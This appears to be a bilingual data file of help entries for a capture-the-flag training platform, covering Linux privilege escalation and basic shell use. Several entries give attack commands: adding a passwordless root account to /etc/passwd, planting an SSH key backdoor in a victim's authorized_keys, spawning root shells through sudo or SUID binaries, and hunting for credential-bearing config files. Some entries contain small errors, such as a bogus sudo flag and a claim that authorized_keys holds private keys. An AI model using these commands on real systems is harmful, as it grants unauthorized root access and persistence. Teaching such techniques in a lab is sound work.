  'PrivEscUx-fichiers' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'fichiers',
    'title' => 'Fichiers intéressants: txt, cfg,...',
    'desc' => '## Fichiers intéressants: txt, cfg,...

Rechercher les fichiers .txt ou .cfg, appartanant aux autres comptes, avec des droits en lecture trop ouverts.
```
find /home -readable -type f  \\( -iname \\*.txt -o -iname \\*.cfg \\) 2>/dev/null
find /home -E . -regex \'.*\\.(txt|cfg)\' 2>/dev/null
```


',
    'title_en' => 'Find readables files',
    'desc_en' => '## Find readables files

Find .txt or .cfg files, owned by other accounts, and readable.
```
find /home -readable -type f  \\( -iname \\*.txt -o -iname \\*.cfg \\) 2>/dev/null
find /home -E . -regex \'.*\\.(txt|cfg)\' 2>/dev/null
```


',
  ),
  'PrivEscUx-wordpress' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'wordpress',
    'title' => 'Web app: Wordpress',
    'desc' => '## Web app: Wordpress

Le fichier de config d\'une appli wordpress s\'appelle:
```
wp-config.php
```

Pour le chercher:
```
find /var -name wp-config.php 2>/dev/null
```

Ce fichier contient les login/password pour se connecter à la base de donnée. Il est possible de dumper la base de donnée et récupérer les login et hashes des comptes wordpress.

',
    'title_en' => 'Web app: Wordpress',
    'desc_en' => '## Web app: Wordpress

Wordpress config file is:
```
wp-config.php
```

Let find it:
```
find /var -name wp-config.php 2>/dev/null
```

This config file contains login/password used to connect to the blog database. By dumping the database, it\'s thus possible to get wordpress user\'s login and password hashes.

',
  ),
  'PrivEscUx-apache' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'apache',
    'title' => 'Web server: Apache',
    'desc' => '## Web server: Apache

Le fichier de config peut porter deux noms:
```
httpd.conf
apache2.conf
```

On le trouve généralement dans un des répertoires:
```
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```


',
    'title_en' => 'Web server: Apache',
    'desc_en' => '## Web server: Apache

Apache config file name may be :
```
httpd.conf
apache2.conf
```

On le trouve généralement dans un des répertoires:
```
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```


',
  ),
  'PrivEscUx-tomcat' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'tomcat',
    'title' => 'Web server: Tomcat',
    'desc' => '## Web server: Tomcat

Le fichier de config porte le nom:
```
server.xml
```

Les mots de passe des utilisateurs se trouvent dans:
```
tomcat-users.xml
```

On trouve généralement ces fichiers dans un des répertoires:
```
TOMCAT-HOME/conf/
/usr/local/tomcat/conf/
```


',
    'title_en' => 'Web server: Tomcat',
    'desc_en' => '## Web server: Tomcat

Tomcat config file is named:
```
server.xml
```

User\'s accounts can be found in :
```
tomcat-users.xml
```

Thos files are usually found in:
```
TOMCAT-HOME/conf/
/usr/local/tomcat/conf/
```


',
  ),
  'PrivEscUx-sudo' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'sudo',
    'title' => 'Sudo',
    'desc' => '## Sudo

Sudo permet de lancer des commandes en tant qu\'un autre utilisateur.<br/>
<br/>
Pour connaitre les droits sudo de votre compte, il faut lancer la commande sudo -l. Il est parfois demandé de saisir votre mot de passe.
```
sudo -l
L\'utilisateur user1 peut utiliser les commandes suivantes sur target-host :
(ALL) NOPASSWD: /usr/bin/find
user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
```


La première ligne est: (ALL) NOPASSWD: /usr/bin/find
Il est possible de lancer la commande /usr/bin/find en tant que n\'importe quel utilisateur du serveur, en particulier root.
```
sudo /usr/bin/find
```


user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
Il est ici possible de lancer la commande \'/usr/bin/python3 /home/user2/run.py\' en tant que user2.
Pour celà on utilise la commande \'sudo\' avec le flag \'-u user2\'
```
sudo -u user2 /usr/bin/python3  /home/user2/run.py
```


Si l\'option NOPASSWD est définie, vous n\'avez pas à saisir de mots de passe. Sinon, la commande sudo demande le mot de passe du compte courant. Si vous être entré par un webshell, ou une connection ssh avec clef privée, il faudra se débrouiller pour connaitre le mot de passe.

',
    'title_en' => 'Sudo',
    'desc_en' => '## Sudo

Sudo is used to run commands as another user.<br/>
<br/>
To know the sudo rights of your account, you have to run the command sudo -l. Sometimes you are asked to enter your password.
```
sudo -l
The user1 can use the following commands on target-host:
(ALL) NOPASSWD: /usr/bin/find
user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
```


The first entry is: (ALL) NOPASSWD: /usr/bin/find
It is possible to run the /usr/bin/find command as any server user, especially root.
```
sudo /usr/bin/find
```


Second entry is: user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
Here it is possible to run the command \'/usr/bin/python3 /home/user2/run.py\' as user2.
For this we use the \'sudo\' command with the \'-u user22\' flag
```
sudo -u user2 /usr/bin/python3 /home/user2/run.py
```


If the NOPASSWD option is set, you do not have to enter any passwords. Otherwise, the sudo command asks for the password of the current account. If you are logged in via a webshell, or an ssh connection with private key, you will have to figure out the password.

',
  ),
  'PrivEscUx-setUID' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'setUID',
    'title' => 'SetUID bits',
    'desc' => '## SetUID bits

Identifier les process possédant un setUID bit
```
find / -perm -4000 -exec ls -al {} \\; 2>/dev/null
```

Que faire avec un binaire possédant un setUID bit ?
```
- Lancer un shell
- Lire un flag
- Copier un fichier
- Ajouter une ligne à un fichier : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
- ...
```


',
    'title_en' => 'SetUID bits',
    'desc_en' => '## SetUID bits

Identify processes with a setUID bit
```
find / -perm -4000 -exec ls -al {} \\; 2>/dev/null
```

What to do with a binary having a setUID bit ?
```
- Run a shell
- Read a flag
- Copy a file
- Add an entry in a file : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
- ...
```


',
  ),
  'PrivEscUx-shell' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'shell',
    'title' => 'Process permettant de lancer un shell',
    'desc' => '## Process permettant de lancer un shell

De nombreux process permettent de lancer un shell. Idéal s\'ils sont en sudo ou avec un setUID bit.
```
- find
- nmap
- vi
- less
- awk
- tee
...
```

Reference: https://gtfobins.github.io/

',
    'title_en' => 'Process to allowing to launch a shell',
    'desc_en' => '## Process to allowing to launch a shell

Many processes allow to launch a shell. Perfect with sudo or a setUID bit.
```
- find
- nmap
- vi
- less
- awk
- tee
...
```

Reference: https://gtfobins.github.io/

',
  ),
  'PrivEscUx-less' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'less',
    'title' => 'Sudo/SUID bit - less',
    'desc' => '## Sudo/SUID bit - less

Less peut être utilisé pour lire des fichiers. Presser q pour sortir du lecteur.
```
./less flag.txt
```

ou pour obtenir un shell en ouvrant un fichier, et une fois dans le lecteur ouvrir un shell en tapant !/bin/sh
```
./less fichier
!/bin/sh
```


',
    'title_en' => 'Sudo/SUID bit - less',
    'desc_en' => '## Sudo/SUID bit - less

Less is used to read files. Press q to exit.
```
./less flag.txt
```

To open a shell, open a file, then !/bin/sh
```
./less fichier
!/bin/sh
```


',
  ),
  'PrivEscUx-privbash' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'privbash',
    'title' => 'Sudo/SUID bit - bash',
    'desc' => '## Sudo/SUID bit - bash

Lancé par sudo ou avec un SUID bit, bash va dropper ses privilèges. Pour garder l\'identifiant root, utiliser l\'option -p.
```
sudo -yolo /bin/bash -p
```

```
./bash -p
```


',
    'title_en' => 'Sudo/SUID bit - bash',
    'desc_en' => '## Sudo/SUID bit - bash

Launched thanks sudo or with SUID bit set, bash drops its privileges. To keep root id, use -p option.
```
bash -p
```


',
  ),
  'PrivEscUx-findsh' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'findsh',
    'title' => 'Sudo/SUID bit - find',
    'desc' => '## Sudo/SUID bit - find

Il est possible d\'utiliser la commande -exec de find pour ouvrir un shell.
On recherche n\'importe quel fichier, et c\'est un prétexte pour lancer la commande /bin/sh.
Ici avec un sudo, le shell sera ouvert en tant que user2:
```
sudo -u user /usr/bin/find . -name readme.txt -exec /bin/sh \\;
```

Si on trouve la commande find, copiée dans un répertoire avec le SUID bit actif, on l\'exploite de la même façon:
```
./find . -name readme.txt -exec /bin/sh \\;
```


',
    'title_en' => 'Sudo/SUID bit - find',
    'desc_en' => '## Sudo/SUID bit - find

To open a shell, find a known file then launch the command: /bin/sh.
```
sudo /usr/bin/find . -name readme.txt -exec /bin/sh \\;
./find . -name readme.txt -exec /bin/sh \\;

',
  ),
  'PrivEscUx-etcpasswd' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'etcpasswd',
    'title' => 'Ajouter un user root sans mot de passe',
    'desc' => '## Ajouter un user root sans mot de passe

Vous disposez des droits pour modifier /etc/passwd. Par exemple tee avec un sudo en root.
Ajoutez une entrée avec un UID de 0, et un mot de passe vide.
```
echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd
su myroot
```


',
    'title_en' => 'Add a password less account with root rights',
    'desc_en' => '## Add a password less account with root rights

If you have the rights to modify /etc/passwd, you can be root. For example tee with a sudo as root.
Add an entry with a UID of 0 (root UID), and an empty password.
```
echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd
su myroot
```


',
  ),
  'PrivEscUx-pubkey' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'pubkey',
    'title' => 'Ajouter une backdoor ssh en injectant une clef publique.',
    'desc' => '## Ajouter une backdoor ssh en injectant une clef publique.

Si une commande avec les droits root permet d\'ajouter une ligne: ex: tee
```
echo \'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com\' | sudo tee -a /home/victim/.ssh/authorized_keys
ssh -i id_rsa victim@iptarget
```


',
    'title_en' => 'Create an ssh backdoor by adding a public key.',
    'desc_en' => '## Create an ssh backdoor by adding a public key.

```
echo \'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com\' > /home/victim/.ssh/authorized_keys
ssh -i id_rsa victim@iptarget
```


',
  ),
  'PrivEscUx-ps' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'ps',
    'title' => 'ps',
    'desc' => '## ps

Identifier les process lancés par root
```
ps eaxf
```

Une fois un process identifé, regarder s\'il est possible de modifier les fichiers lus par le process, ou si le process a des vulnérabilités connues.

',
    'title_en' => 'ps',
    'desc_en' => '## ps

Identify processes running as root
```
ps eaxf
```

Once an interresting process found, see if it\'s possible to modify the files read by the process, or if the process has known vulnerabilities.

',
  ),
  'PrivEscUx-cron' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'cron',
    'title' => 'Cron',
    'desc' => '## Cron

Identifier les taches lancées par cron.
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
```


',
    'title_en' => 'Cron',
    'desc_en' => '## Cron

Identify cron tasks.
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
```


',
  ),
  'PrivEscUx-process' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'process',
    'title' => 'Process Spy',
    'desc' => '## Process Spy

With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
The pspy tool monitors the processes for you.
```
https://github.com/DominicBreuker/pspy
```


',
    'title_en' => 'Process Spy',
    'desc_en' => '## Process Spy

With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
The pspy tool monitors the processes for you.
```
https://github.com/DominicBreuker/pspy
```


',
  ),
  'PrivEscUx-os' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'os',
    'title' => 'Kernel exploit',
    'desc' => '## Kernel exploit

Linux Distib version:
```
cat /etc/issue
Ubuntu 18.04.3 LTS
```

Linux kernel version: 5.0.0-37-generic
```
uname -a
Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Once the kernel version is known, it is possible to search for a kernel exploit<br/>
https://github.com/SecWiki/linux-kernel-exploits<br/>
Never run an unknown binary !<br/>
Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.

',
    'title_en' => 'Kernel exploit',
    'desc_en' => '## Kernel exploit

Linux Distib version:
```
cat /etc/issue
Ubuntu 18.04.3 LTS
```

Linux kernel version: 5.0.0-37-generic
```
uname -a
Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Once the kernel version is known, it is possible to search for a kernel exploit<br/>
https://github.com/SecWiki/linux-kernel-exploits<br/>
Never run an unknown binary !<br/>
Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.

',
  ),
  'PrivEscUx-linenum' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'linenum',
    'title' => 'Enum scripts',
    'desc' => '## Enum scripts

Some well known script automate the enumeration process.<br/>
Test them and find the one that suits you best.
```
linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
```



',
    'title_en' => 'Enum scripts',
    'desc_en' => '## Enum scripts

Some well known script automate the enumeration process.<br/>
Test them and find the one that suits you best.
```
linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
```



',
  ),
  'Shell-intro' => 
  array (
    'category' => 'Shell',
    'id' => 'intro',
    'title' => 'Shell',
    'desc' => '## Shell

Ton terminal utilise des commandes shell pour manipuler le système de fichier.
.
Il existe plusieurs shells, chacun avec leur particularité.
Nous regardons le plus commun, le shell bash.
.
Tu es connecté sur un compte, que tu peux connaitre avec la commande id.
Ce compte a des droits, et appartient à des groupes.
Avec la commande ls -al xxx, tu affiches les droits de chaque fichiers.
.
Le jeu va consister à trouver les fichiers appartenant à d\'autres comptes, avec des droits en lecture trop ouverts.
Nous allons aussi essayer de nous connecter à d\'autres comptes.
L\'objectif étant de passer sur le compte administrateur (root).

',
    'title_en' => 'Shell',
    'desc_en' => '## Shell

Your terminal uses shell commands to manipulate the file system.
.
There are several shells, each with its own particularity.
We are looking at the most common one, the bash shell.
.
You are logged into an account, which you can get to know with the command id.
This account has rights, and belongs to groups.
With the command ls -al xxx, you display the rights of each file.
.
We will read every readable file belonging to other accounts and get valuables informations.
We will also try to get acces to other accounts.
The ultimate goal is to get the administrator\'s account (root).

',
  ),
  'Shell-commandes' => 
  array (
    'category' => 'Shell',
    'id' => 'commandes',
    'title' => 'Commandes shell usuelles',
    'desc' => '## Commandes shell usuelles

```
ls        : afficher le contenu du répertoire courant
ls -l     : afficher le contenu du répertoire courant, avec des info sur les droits des fichiers
ls -l xxx : afficher les droits du fichier xxx
ls -al    : afficher le contenu du répertoire courant, y compris les fichiers cachés
cat xxx   : afficher le contenu du fichier xxx
pwd       : répertoire courant
cd xxx    : se déplacer dans le répertoire xxx
cd ..     : se déplacer vers le répertoire parent
id        : identifiant du compte et groupes auquel il appartient
uname -a  : informations sur le serveur: quelle distribution et version du kernel.
```


',
    'title_en' => 'Common shell commands',
    'desc_en' => '## Common shell commands

```
ls        : display the content of the current directory
ls -l     : display the contents of the current directory, with info on file permissions
ls -l xxx : display the rights of file xxx
ls -al    : display the contents of the current directory, including hidden files
cat xxx   : display the content of file xxx
pwd       : current directory
cd xxx    : move to the xxx directory
cd .      : move to parent directory
id        : identifier of the current account and groups it belongs to
uname -a  : server information: which distribution and kernel version.
```


',
  ),
  'Shell-flag_shell' => 
  array (
    'category' => 'Shell',
    'id' => 'flag_shell',
    'title' => 'Flag',
    'desc' => '## Flag

Quelques flags sont accessibles dans ton terminal.<br/>
Tu peux commencer dans le répertoire /home/yolo/flags avant d\'étendre à tout ton système.<br/>
C\'est l\'occasion de mettre en pratique les commandes détaillées dans ce chapitre.
Et puisque tu lis la doc, c\'est cadeau : Flag_rtfm_shell
```
cd ~/flags
```


',
    'title_en' => 'Flag',
    'desc_en' => '## Flag

Some flags can be found in your terminal.<br/>
Start in the /home/yolo/flags directory before expanding to your entire system.<br/>
This is an opportunity to practice the commands detailed in this chapter.
And since you read the manual, here is a gift: Flag_rtfm_shell
```
cd ~/flags
```


',
  ),
  'Shell-dir' => 
  array (
    'category' => 'Shell',
    'id' => 'dir',
    'title' => 'Répertoires courants',
    'desc' => '## Répertoires courants

Le système de fichier Unix part de la racine : /<br/>
Il contient généralement les répertoires:
```
/home/xxx : un répertoire par compte utilisateur xxx
~        : votre répertoire utilisateur
/root    : le répertoire de l\'administrateur
/tmp     :  fichiers temporaires
/bin     : commandes systèmes
/etc     : fichiers de configuration du système
/var/log : logs des programmes comme le serveur web
/var/www : emplacement par défaut des fichiers des serveurs web
```


',
    'title_en' => 'Common directories',
    'desc_en' => '## Common directories

The Unix file system starts from the root: /<br/>
It usually contains the directories:
```
/home/xxx: one directory per user account xxx
~        : your user directory
/root    : the administrator\'s directory
/tmp     : temporary files
/bin     : system commands
/etc     : system configuration files
/var/log : logs of programs like the web server
/var/www : default location for web server files
```


',
  ),
  'Shell-shell-permissions' => 
  array (
    'category' => 'Shell',
    'id' => 'shell-permissions',
    'title' => 'Unix - Permissions des fichiers',
    'desc' => '## Unix - Permissions des fichiers
Tous les fichiers et répertoires ont un propriétaire, et font parti d\'un groupe.
Chaque fichier défini donc des permissions pour:
- User:  le propriétaire
- Group: les utilisateurs qui font partie du groupe
- Other: les utilisateurs qui ne sont ni propriétaire ni dans le groupe

Les permissions de base sont:
- Read: Lecture
- Write: Ecriture
- eXecute: Execution

Lecture des droits des fichiers
```
ls -al          : -al permet de lister les droits des fichiers, y compris cachés
rwxr-xr--
\\ /\\ /\\ /
v  v  v
|  |  droits des autres utilisateurs (o)
|  |
|  droits des utilisateurs appartenant au groupe (g)
|
droits du propriétaire (u)
```


```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          : droits du répertoire courant
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         : droits du répertoire parent
-rw-rw-r--  1 yolo yolo 5917 janv. 25 14:23 readme.txt : lecture /écriture User/Group, lecture seule pour Other
-rwxr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : lecture/écriture/execution pour le User, lecture/execution pour le groupe et les autres
```


Des permissions supplémentaires existent:
- SUID: Set UID, le fichier est éxécuté avec les droits de son propriétaire
- SGID: Set GUID, le fichier est éxécuté avec les droits de son groupe
- Sticky Bit: Lorsque ce droit est positionné sur un répertoire, il interdit la suppression d\'un fichier qu\'il contient à tout utilisateur autre que le propriétaire du fichier.

```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..
rwsr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : le x est remplacé par un s pour le User
```

Le SUID bit nous permet de lancer des commandes avec les droits d\'un autre utilisateur et faire de l\'élévation de privilège.

',
    'title_en' => 'Unix - File Permission',
    'desc_en' => '## Unix - File Permission
All files and directories have an owner, and are part of a group.
Each file therefore defines permissions for:
- User: the owner
- Group: users who are part of the group
- Other: users who are neither the owner nor in the group

Basic permissions are:
- Read: Read
- Write: Writing
- eXecute: Execution

Listing file rights
```
ls -al          : -al allows to list the rights of files, including hidden ones.
rwxr-xr--
\\ /\\ /\\ /
v  v  v
|  |  rights of other users (o)
|  |
|  rights of users belonging to the group (g)
|
owner\'s rights (u)
```

```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          : rights of the current directory
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         : parent directory rights
-rw-rw-r--  1 yolo yolo 5917 janv. 25 14:23 readme.txt : read/write User/Group, read only for Other
-rwxr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : read/write/execute for user, read/execute for group and others
```



Additional permissions exist:
- SUID: Set UID, the file is executed with the rights of its owner.
- SGID: Set GUID, the file is executed with the rights of its group.
- Sticky Bit: When this right is set on a directory, it prevents any user other than the owner of the file from deleting a file in the directory.

```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..
rwsr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : the x is replaced by an s for User
```

The SUID bit allows us to launch commands with the rights of another user and make privilege elevation.

',
  ),
  'Shell-chmod' => 
  array (
    'category' => 'Shell',
    'id' => 'chmod',
    'title' => 'Changer les droits d\'un fichier',
    'desc' => '## Changer les droits d\'un fichier
La commande chmod permet d\'ajouter (+) ou supprimer (-) les droits (r,w,x) aux propriétaire (u), group (g), autres (o) ou tous (a)
```
chmod u+x ./run  : ajout du droit en execution pour le propriétaire
chmod g-x ./run  : suppression du droit d\'execution pour le groupe
chmod o+r ./run  : ajout du droit en lecture pour les autres
chmod a+w ./run  : ajout du droit en écriture pour tous
```


Il est possible de préciser les valeurs de x,r,w sont directement sous forme binaire.
```
r=4, w=2, x=1

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4

rwxrx-r-- = 764
chmod 764 readme.txt
```



',
    'title_en' => 'Set file permissions',
    'desc_en' => '## Set file permissions
The chmod command allows to add (+) or remove (-) the rights (r,w,x) to the owner (u), group (g), others (o) or all (a).
```
chmod u+x ./run  : the owner can execute
chmod g-x ./run  : the group can\'t execute
chmod o+r ./run  : others can read
chmod a+w ./run  : all can write in the file
```


Values of x,r,w can be set in binary form.
```
r=4, w=2, x=1

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4

rwxrx-r-- = 764
chmod 764 readme.txt
```


',
  ),
  'Shell-files' => 
  array (
    'category' => 'Shell',
    'id' => 'files',
    'title' => 'Fichiers utiles',
    'desc' => '## Fichiers utiles

```
/etc/passwd : liste des comptes de la machine
/etc/hosts : le nom de la machine et ses alias
```


',
    'title_en' => 'Usefull files',
    'desc_en' => '## Usefull files

```
/etc/passwd : users list
/etc/hosts : host names and aliases
```


',
  ),
  'Shell-find' => 
  array (
    'category' => 'Shell',
    'id' => 'find',
    'title' => 'find',
    'desc' => '## find
La commande find permet de chercher des fichiers dans les répertoires, et éventuellement d\'effectuer des actions sur les fichiers trouvés.
```
find . -name *.txt```

Rechercher les fichiers ayant l\'extention .txt dans le répertoire courant et les sous répertoires
```
find / -name *.php```

Rechercher les fichiers ayant l\'extention .php à partir de la racine.
```
find / -name *.php 2&gt;/dev/null```

L\'écran est saturé par la liste des répertoires qui nous sont interdits en lecture. La commande 2>/dev/null redirige les erreurs vers le fichier virtuel /dev/null ce qui les fait disparaitre de l\'affichage.
```
find / -name *.php -exec ls {} \\; 2&gt;/dev/null```

L\'option -exec permet d\'éxécuter une commande sur chaque fichier trouvé. Souvent ls -al, ou cat.
{} est remplacé par le nom du fichier trouvé.
\\; signale la fin de la commande à éxécuter.

',
    'title_en' => 'find',
    'desc_en' => '## find
The find command is used to search for files in directories, and possibly to perform actions on the found files.
```
find . -name *.txt```

Search for files with the .txt extension in the current directory and subdirectories.
```
find / -name *.php```

Search for files with the .php extension from the root.
```
find / -name *.php 2&gt;/dev/null```

The screen is saturated with the list of directories that are forbidden to us to read. The command 2>/dev/null redirects the errors to the virtual file /dev/null which makes them disappear from the display.
```
find / -name *.php -exec ls {} \\; 2&gt;/dev/null```

The -exec option is used to run a command on each file found. Often ls -al, or cat.
{} is replaced by the name of the file found.
\\; is put at the end of the command to be executed.


',
  ),
  'Shell-find-exec' => 
  array (
    'category' => 'Shell',
    'id' => 'find-exec',
    'title' => 'find -exec',
    'desc' => '## find -exec
La commande find permet d\'éxecuter des commandes sur les fichiers trouvés.

```
find / -name *.txt -user yolo -exec cat {} \\; 2&gt;/dev/null```

Executer la commande cat sur tous les fichiers .txt appartenant à yolo à partir de la racine.

___Syntaxe de la commande:___
Le {} est remplacé par le nom des fichiers trouvés, et le \\; sert de délimiteur de fin de commande à éxécuter.

',
    'title_en' => 'find -exec',
    'desc_en' => '## find -exec
The find command is used to execute commands on found files.

```
find / -name *.txt -user yolo -exec cat {} \\; 2&gt;/dev/null```

Run the cat command on all .txt files belonging to yolo from the root.

___Syntax of the command:___
The {} is replaced by the name of the found files, and the \\; is used as the end-of-command delimiter for the command to be executed.

',
  ),
  'Shell-ssh' => 
  array (
    'category' => 'Shell',
    'id' => 'ssh',
    'title' => 'SSH',
    'desc' => '## SSH

Les connexions aux serveurs se font en ssh.<br/>
Soit avec un login/password
```
ssh user@hostname
```

Soit avec un fichier de clef privée
```
ssh -i id_rsa user@hostname
```


',
    'title_en' => 'SSH',
    'desc_en' => '## SSH

Connections to the servers are done in ssh.<br/>
Either with a login/password
```
ssh user@hostname
```

Either with a private key file
```
ssh -i id_rsa user@hostname
```


',
  ),
  'Shell-sshidrsa' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsa',
    'title' => 'SSH : Clef privées / Publiques',
    'desc' => '## SSH : Clef privées / Publiques

Sur les serveurs, il est fréquent de s\'identifier avec une clef privée plutôt qu\'un mot de passe.
Vos clefs se trouvent en :
```
$ ls -al ~/.ssh
total 20
drwx------  2 yolo yolo 4096 Apr  4 13:47 .
drwxr-xr-x 27 yolo yolo 4096 Apr  4 13:22 ..
-rw-------  1 yolo yolo 2610 Apr  4 13:47 id_rsa
-rw-r--r--  1 yolo yolo  575 Apr  4 13:47 id_rsa.pub
-rw-r--r--  1 yolo yolo 1998 Apr  1 19:45 known_hosts
```

Les clefs privées permettant de se connecter à votre compte sont dans le fichier :
```
~/.ssh/authorized_keys
```


',
    'title_en' => 'SSH : Private / Public keys pairs',
    'desc_en' => '## SSH : Private / Public keys pairs

On servers, it is common to identify yourself with a private key rather than a password.
Your keys can be found in :
```
$ ls -al ~/.ssh
total 20
drwx------  2 yolo yolo 4096 Apr  4 13:47 .
drwxr-xr-x 27 yolo yolo 4096 Apr  4 13:22 ..
-rw-------  1 yolo yolo 2610 Apr  4 13:47 id_rsa
-rw-r--r--  1 yolo yolo  575 Apr  4 13:47 id_rsa.pub
-rw-r--r--  1 yolo yolo 1998 Apr  1 19:45 known_hosts
```

Your private keys are in the file :
```
~/.ssh/authorized_keys
```


',
  ),
  'Shell-sshidrsagen' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsagen',
    'title' => 'SSH : Générer des clef',
    'desc' => '## SSH : Générer des clef

Générer une paire de clef privée/publique:<br/>
Taper juste [entrée] à (empty for no passphrase) pour générer une clef privée sans mot de passe.
Si vous saisissez un mot de passe, votre clef sera chiffrée, et vous devrez taper le mot de passe à chaque utilisation.
```
$ ssh-keygen -t rsa -b 4096 -C yolo@yoloctf.org -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:OSHYGRwrI7LM9/8haFfVXgBlXrdHcdfEZxIv9CeWg5Q yolo@yoloctf.org
The key\'s randomart image is:
+---[RSA 4096]----+
|     .o.   .+=o*O|
|     o.+   .Eo+=X|
|. . + = .  ..o*=*|
|oo . o . o. ...+o|
|.o .    S.   .   |
|  . . . ..       |
|     + o .       |
|    . o . .      |
|       ...       |
+----[SHA256]-----+
```

Le fichier de clef privée ne doit être lisible que par son propriétaire.<br/>
Si besoin faire : chmod 600 id_rsa.
```
vagrant@kali:/home/yolo/tmp$ ls -al
total 16
drwxrwxrwx  2 yolo      yolo   4096 Apr  4 13:24 .
drwxr-xr-x 27 yolo 		yolo   4096 Apr  4 13:22 ..
-rw-------  1 yolo      yolo   3381 Apr  4 13:24 id_rsa
-rw-r--r--  1 yolo      yolo    742 Apr  4 13:24 id_rsa.pub
```

Les entêtes de clef privées sont caractéristiques
```
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
7KrJLvv/4Ve+Dm5bLwhJ9BkLessiIlGgx0ju+ghI7V+Ar+qAhir5chpVSGH4YIk0J8VDbJ
...
O9mUtgl8PKUd5AQL6sMM/FaYffu7+OFQkJzv3hxyiFEQPhsAo2K55cG8S0RWCX9Jp96U54
lOXLj6MfGkfzuvvFS4pm9iTBrwKq8h7CubmNOnHe3TH3U/Mrzf6wq8MwAEpSeTWfnBGdRP
tHOBQdCIQj3JAAAAEHlvbG9AeW9sb2N0Zi5vcmcBAg==
-----END OPENSSH PRIVATE KEY-----
```

Entête d\'une clef privée protégée par mot de passe:
```
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```



La clef publique associée :
```
$ cat id_rsa.pub
